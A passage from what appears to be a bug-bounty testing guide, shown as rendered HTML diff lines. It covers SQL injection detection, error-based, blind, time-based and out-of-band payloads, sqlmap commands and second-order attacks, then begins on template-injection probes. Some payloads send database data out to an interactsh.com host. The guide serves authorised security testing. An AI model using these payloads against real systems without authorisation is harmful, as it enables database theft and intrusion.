+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="s1">&#39;</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="s1">&#39;&#39;</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="s1">&#39;))</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1-- -</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="s1">-- Numeric context (no quotes):</span>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="s1">1 AND 1=1</span>
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="s1">1 AND 1=2</span>
+</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a><span class="s1">1 ORDER BY 1-- -</span>
+</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="s1">1 ORDER BY 100-- -   ← error if column count exceeded</span>
+</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>
+</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="s1">-- Boolean canary (no error, behavior changes):</span>
+</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1-- -    ← true: same results</span>
+</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">2</span><span class="c1">-- -    ← false: empty/different results</span>
+</span></code></pre></div>
+<p><strong>Signs of vulnerability:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>→ Database error message (MySQL/MSSQL/OracleDB syntax visible)
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>→ Empty response when data is expected (false condition)
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>→ Different response size for true vs false condition
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>→ 500 error / application crash
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>→ Time delay (time-based blind)
+</span></code></pre></div></p>
+<p><strong>Where to look beyond URL params:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Search fields, filter params, login forms
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>Order/sort: ?sort=name&amp;order=asc
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>HTTP headers: User-Agent, X-Forwarded-For, Referer (often logged to DB)
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>Cookies containing IDs or session data
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>ORDER BY / GROUP BY params — cannot use prepared statements in most DBs
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>JSON body: {&quot;filter&quot;: {&quot;name&quot;: &quot;test&#39; AND 1=1-- -&quot;}}
+</span></code></pre></div></p>
+<hr />
+<h3 id="422-sqli-types">4.2.2 SQLi Types<a class="headerlink" href="#422-sqli-types" title="Permanent link">&para;</a></h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:4"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><input id="__tabbed_3_3" name="__tabbed_3" type="radio" /><input id="__tabbed_3_4" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">Error-based</label><label for="__tabbed_3_2">Boolean blind</label><label for="__tabbed_3_3">Time-based blind</label><label for="__tabbed_3_4">Out-of-band (DNS)</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-sql highlight"><span class="filename">error_based.sql</span><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1">-- MySQL:</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="s1">&#39; AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">UPDATEXML</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">-- -</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="c1">-- PostgreSQL:</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="s1">&#39; AND 1=CAST((SELECT version()) AS INT)-- -</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="s1">-- MSSQL:</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="k">CONVERT</span><span class="p">(</span><span class="nb">INT</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="o">@@</span><span class="k">version</span><span class="p">))</span><span class="c1">-- -</span>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="c1">-- Oracle:</span>
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="n">CTXSYS</span><span class="p">.</span><span class="n">DRITHSX</span><span class="p">.</span><span class="n">SN</span><span class="p">(</span><span class="mi">1</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">rownum</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span><span class="c1">-- -</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-sql highlight"><span class="filename">boolean_blind.sql</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1">-- True condition (same response as normal):</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="s1">&#39; AND 1=1-- -</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="s1">-- False condition (different/empty response):</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="c1">-- -</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="c1">-- Extract character by character:</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="s1">&#39; AND SUBSTRING(database(),1,1)=&#39;</span><span class="n">a</span><span class="s1">&#39;-- -</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ASCII</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">97</span><span class="c1">-- -  ← binary search</span>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ASCII</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">109</span><span class="c1">-- - ← exact match</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-sql highlight"><span class="filename">time_based.sql</span><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1">-- MySQL:</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="s1">&#39; AND SLEEP(5)-- -</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">IF</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="c1">-- -</span>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="c1">-- PostgreSQL:</span>
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="s1">&#39;; SELECT pg_sleep(5)-- -</span>
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="s1">-- MSSQL:</span>
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="s1">&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">-- -</span>
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="c1">-- Confirm with timing:</span>
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="c1">-- time curl -s &quot;https://target.com/search?q=test&#39; AND SLEEP(5)-- -&quot;</span>
+</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="c1">-- real 5.032s → confirmed</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-sql highlight"><span class="filename">oob_sqli.sql</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1">-- MSSQL (most reliable):</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="s1">&#39;; EXEC master..xp_dirtree &#39;</span><span class="err">\\</span><span class="n">abc123</span><span class="p">.</span><span class="n">interactsh</span><span class="p">.</span><span class="n">com</span><span class="err">\</span><span class="k">share</span><span class="s1">&#39;-- -</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="s1">-- MySQL (requires FILE privilege):</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">LOAD_FILE</span><span class="p">(</span><span class="n">CONCAT</span><span class="p">(</span><span class="s1">&#39;\\\\&#39;</span><span class="p">,(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="s1">&#39;.abc123.interactsh.com\\abc&#39;</span><span class="p">))</span><span class="c1">-- -</span>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="c1">-- Oracle:</span>
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="s1">&#39; AND (SELECT UTL_HTTP.request(&#39;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">abc123</span><span class="p">.</span><span class="n">interactsh</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="err">&#39;</span><span class="o">||</span>
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="w">  </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">rownum</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">dual</span><span class="p">)</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="c1">-- -</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="423-sqlmap-usage-on-live-targets">4.2.3 sqlmap Usage on Live Targets<a class="headerlink" href="#423-sqlmap-usage-on-live-targets" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">sqlmap_safe.sh</span><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Detection — least invasive first:</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;https://target.com/search?q=test&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="w">  </span>--level<span class="o">=</span><span class="m">1</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">1</span><span class="w"> </span>--batch<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="w">  </span>--technique<span class="o">=</span>BEUST<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="w">  </span>--delay<span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="w">  </span>--output-dir<span class="o">=</span>./sqlmap_output
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>
+</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="c1"># With authentication:</span>
+</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;https://target.com/search?q=test&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="w">  </span>--cookie<span class="o">=</span><span class="s2">&quot;session=&lt;token&gt;&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">2</span><span class="w"> </span>--batch
+</span><span id="__span-27-11"><a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>
+</span><span id="__span-27-12"><a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="c1"># From a saved Burp request:</span>
+</span><span id="__span-27-13"><a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>request.txt<span class="w"> </span>--level<span class="o">=</span><span class="m">2</span><span class="w"> </span>--batch
+</span><span id="__span-27-14"><a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a>
+</span><span id="__span-27-15"><a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="c1"># After confirming injection — extract minimal PoC:</span>
+</span><span id="__span-27-16"><a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>--dbs<span class="w">                          </span><span class="c1"># list databases</span>
+</span><span id="__span-27-17"><a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>--tables<span class="w">          </span><span class="c1"># list tables</span>
+</span><span id="__span-27-18"><a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="w"> </span>-D<span class="w"> </span>target_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump<span class="w">   </span><span class="c1"># dump table (2-3 rows max)</span>
+</span></code></pre></div>
+<div class="admonition danger">
+<p class="admonition-title">Rules for live programs</p>
+<p>Always start at <code>--level=1 --risk=1</code>. Throttle with <code>--delay=2</code>. Never use <code>--os-shell</code>, <code>--os-cmd</code>, <code>--file-write</code>, or <code>--file-read</code> on live targets. Once injection is confirmed — stop sqlmap, report manually. Do not dump the entire database. Two or three rows as PoC is sufficient.</p>
+</div>
+<hr />
+<h3 id="424-second-order-sqli">4.2.4 Second-Order SQLi<a class="headerlink" href="#424-second-order-sqli" title="Permanent link">&para;</a></h3>
+<p>The payload is stored safely (escaped) on input, but when retrieved and used in a subsequent query without re-sanitization, injection occurs.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>Classic example:
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>  Register with username: admin&#39;-- -
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>  → Stored safely (escaped) in DB
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>  Password change query uses stored username:
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>  UPDATE users SET password=&#39;new&#39; WHERE username=&#39;admin&#39;-- -&#39;
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>  → Closes string, comments out rest → changes admin&#39;s password
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">second_order_test.sh</span><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># 1. Register/create with SQL payloads:</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="c1">#    admin&#39;-- -</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="c1">#    test&#39; AND &#39;1&#39;=&#39;1</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="c1">#</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="c1"># 2. Perform operations that use the stored value in a new query:</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="c1">#    - Change password</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="c1">#    - Update profile</span>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="c1">#    - Export data using stored preferences</span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="c1">#    - Search using stored settings</span>
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="c1">#</span>
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="c1"># 3. Look for: changed behavior, errors, wrong data returned</span>
+</span></code></pre></div>
+<hr />
+<h3 id="425-sqli-checklist">4.2.5 SQLi Checklist<a class="headerlink" href="#425-sqli-checklist" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>DETECTION
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>□ Single quote in every parameter — error or behavior change?
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>□ Boolean true/false conditions — different response size?
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>□ SLEEP() in every parameter — time delay?
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>□ Non-standard locations: headers, cookies, JSON body, ORDER BY
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>IDENTIFICATION
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>□ Identify database type (MySQL, Postgres, MSSQL, Oracle)
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>□ Identify injection type (error, boolean blind, time blind, OOB)
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>EXPLOITATION (PoC only — minimal footprint)
+</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>□ Confirm with sqlmap at level=1/risk=1
+</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>□ Extract: DB version, current user, DB name
+</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>□ Extract: one sample row from users table — no full dumps
+</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>□ Second-order: register with payload, trigger via profile update
+</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>□ HTTP headers: User-Agent, X-Forwarded-For, Referer
+</span><span id="__span-30-17"><a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a>□ ORDER BY / GROUP BY params
+</span></code></pre></div>
+<hr />
+<h2 id="43-server-side-template-injection-ssti">4.3 Server-Side Template Injection (SSTI)<a class="headerlink" href="#43-server-side-template-injection-ssti" title="Permanent link">&para;</a></h2>
+<p>Template engines let developers embed expressions like <code>{{user.name}}</code> in HTML. If user input is passed directly into the template string rather than as a variable value, the attacker can inject expressions that execute on the server — often leading to full RCE.</p>
+<h3 id="431-detection-and-engine-identification">4.3.1 Detection and Engine Identification<a class="headerlink" href="#431-detection-and-engine-identification" title="Permanent link">&para;</a></h3>
+<p><strong>Polyglot probe — inject this first:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>{{7*7}}${7*7}#{7*7}&lt;%= 7*7 %&gt;{{7*&#39;7&#39;}}
+</span></code></pre></div>
+<p>If the response contains <code>49</code>, <code>7777777</code>, or a math result — SSTI confirmed.</p>
+<p><strong>Where to probe:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>URL parameters: ?name=John{{7*7}}
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Profile fields: display name, bio, email templates
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>Search fields rendered back to page
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>Uploaded file names
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>Error messages that reflect paths
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>Feedback forms
+</span></code></pre></div></p>
+<p><strong>Engine identification via differentiation:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Probe</th>
+<th>Result</th>
+<th>Engine</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{{7*7}}</code></td>
+<td><code>49</code></td>
+<td>Jinja2, Twig, Pebble</td>
+</tr>
+<tr>
+<td><code>${7*7}</code></td>
+<td><code>49</code></td>
+<td>FreeMarker, Velocity, Thymeleaf</td>
+</tr>
+<tr>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+<td><code>49</code></td>
+<td>ERB (Ruby), EJS (Node)</td>
+</tr>
+<tr>
+<td><code>{{7*'7'}}</code></td>
+<td><code>7777777</code></td>
+<td>Jinja2</td>
+</tr>
+<tr>
+<td><code>{{7*'7'}}</code></td>
+<td><code>49</code></td>
